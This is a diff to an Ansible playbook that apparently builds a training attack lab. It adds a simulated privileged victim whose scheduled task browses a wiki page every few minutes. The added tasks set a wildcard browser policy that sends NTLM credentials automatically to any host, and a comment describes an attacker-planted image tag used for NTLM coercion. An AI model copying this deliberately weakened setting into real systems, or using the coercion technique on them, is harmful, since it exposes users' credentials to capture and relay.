@@ -165,3 +165,47 @@
         --master "{{ charlie_kdbx_master_password }}"
       args:
         creates: "{{ charlie_backups_share_path }}\\{{ charlie_kdbx_filename }}"
+
+# =============================================================================
+# Simulated privileged victim browser (M4.2). helpdesk_admin is autologged-in on
+# this host; a scheduled task in their session opens the wiki VPN runbook every
+# few minutes. Rendering the page loads the attacker-planted <img src=//attacker>
+# -> NTLM coercion. Replaces ludus_ghosts_client (no GHOSTS server available).
+# =============================================================================
+- name: Victim browser -- allow Edge/Chrome to auto-send NTLM to any host (lab)
+  when: charlie_enable_victim_browser | bool
+  ansible.windows.win_regedit:
+    path: "{{ item }}"
+    name: AuthServerAllowlist
+    data: "*"
+    type: string
+  loop:
+    - 'HKLM:\SOFTWARE\Policies\Microsoft\Edge'
+    - 'HKLM:\SOFTWARE\Policies\Google\Chrome'
+
+- name: Victim browser -- stage the browse script
+  when: charlie_enable_victim_browser | bool
+  ansible.windows.win_template:
+    src: victim_browse.cmd.j2
+    dest: 'C:\Windows\Temp\victim_browse.cmd'
+
+- name: Victim browser -- scheduled task browses the wiki as the victim (every 3 min)
+  when: charlie_enable_victim_browser | bool
+  community.windows.win_scheduled_task:
+    name: TLO-VictimBrowse
+    description: "IT helpdesk VPN runbook check"
+    username: "{{ charlie_netbios }}\\{{ charlie_victim_user }}"
+    password: "{{ charlie_victim_password }}"
+    logon_type: interactive_token
+    actions:
+      - path: cmd.exe
+        arguments: '/c C:\Windows\Temp\victim_browse.cmd'
+    triggers:
+      - type: logon
+      - type: daily
+        start_boundary: '2026-01-01T08:00:00'
+        repetition:
+          interval: PT3M
+          duration: PT12H
+    state: present
+    enabled: true
